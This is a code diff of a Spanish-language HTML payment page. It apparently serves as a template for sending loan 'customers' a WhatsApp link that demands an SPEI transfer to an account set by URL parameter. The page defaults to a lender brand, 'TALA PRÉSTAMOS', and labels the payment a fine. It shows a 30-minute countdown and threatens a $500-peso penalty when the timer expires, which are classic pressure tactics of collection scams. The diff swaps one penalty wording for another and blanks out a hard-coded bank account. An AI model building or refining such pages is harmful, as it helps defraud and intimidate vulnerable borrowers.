@@ -10,27 +10,23 @@
         body { font-family: 'Inter', sans-serif; background-color: #0b1120; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
         .card-main { width: 100%; max-width: 420px; background: white; border-radius: 3rem; overflow: hidden; margin: 15px; }
         
-        /* ESTILO EXACTO DEL TEXTO DE ADVERTENCIA */
-        .aviso-vencimiento {
-            color: #ff5a5a; /* Rojo rosado de la captura */
-            font-size: 13px;
-            line-height: 1.2;
-            margin-top: 10px;
-            font-weight: 500;
-            text-align: left;
-        }
-        .aviso-vencimiento b {
-            font-weight: 700;
-        }
-
         .timer-box { 
             background-color: #fff1f1; 
             border-radius: 1.5rem; 
             padding: 1.25rem; 
             margin-top: 1rem;
-            border: 1px solid #ffe4e4;
+            border: 1px solid #fee2e2;
         }
         .timer-val { color: #f87171; font-weight: 800; font-size: 1.6rem; }
+
+        /* ESTILO DEL TEXTO DE PENALIZACIÓN QUE SOLICITASTE */
+        .texto-penalizacion {
+            color: #ef4444; 
+            font-size: 11px;
+            line-height: 1.4;
+            margin-top: 10px;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -59,19 +55,17 @@
                 <div class="timer-box">
                     <div class="flex justify-between items-center">
                         <span class="text-[10px] font-extrabold text-[#ef4444] uppercase tracking-wider">La liga expira en:</span>
-                        <span id="timer" class="timer-val">29:30</span>
+                        <span id="timer" class="timer-val">29:50</span>
                     </div>
-                    <p class="aviso-vencimiento">
-                        * Al llegar a 0, se cobrarán <b>$500.00 pesos adicionales</b> por concepto de<br>
-                        vencimiento de liga de pago.
+                    <p class="texto-penalizacion">
+                        * Al llegar a 0, se cobrará una penalización de <b>$500,00 pesos ADICIONALES</b> por concepto de vencimiento de liga.
                     </p>
                 </div>
             </div>
 
             <div class="bg-blue-50/40 rounded-[2rem] p-6 border border-blue-100 text-center space-y-1">
-                <span id="txt-banco-label" class="text-[10px] font-bold text-blue-500 uppercase tracking-tighter">TRANSFERENCIA MERCADO PAGO (SPEI)</span>
-                <div id="txt-clabe" class="text-2xl font-black text-blue-700 tracking-tight">722969010005687921</div>
-                <p class="text-[10px] font-medium italic text-blue-400">Referencia: Pago de Multa</p>
+                <span id="txt-banco-label" class="text-[10px] font-bold text-blue-500 uppercase tracking-tighter">TRANSFERENCIA (SPEI)</span>
+                <div id="txt-clabe" class="text-2xl font-black text-blue-700 tracking-tight">000000000000000000</div>
             </div>
 
             <button onclick="copiar()" class="w-full bg-[#22c55e] text-white font-black py-5 rounded-[1.5rem] uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">
@@ -88,8 +82,8 @@
         document.getElementById('txt-nom').innerText = (urlParams.get('n') || "CLIENTE").toUpperCase();
         document.getElementById('txt-fec').innerText = urlParams.get('f') || "2026-03-07";
         document.getElementById('txt-prod').innerText = urlParams.get('pr') || "TALA PRÉSTAMOS";
-        document.getElementById('txt-clabe').innerText = urlParams.get('cl') || "722969010005687921";
-        document.getElementById('txt-banco-label').innerText = `TRANSFERENCIA ${urlParams.get('b') || 'MERCADO PAGO'} (SPEI)`;
+        document.getElementById('txt-clabe').innerText = urlParams.get('cl') || "";
+        document.getElementById('txt-banco-label').innerText = `TRANSFERENCIA ${urlParams.get('b') || 'BANCARIA'} (SPEI)`;
 
         function updateTimer() {
             const diff = (30 * 60 * 1000) - (Date.now() - start);
@@ -106,7 +100,7 @@
 
         function copiar() {
             navigator.clipboard.writeText(window.location.href);
-            alert("Enlace copiado. Pégalo en el chat de WhatsApp.");
+            alert("Link copiado para WhatsApp.");
         }
     </script>
 </body>
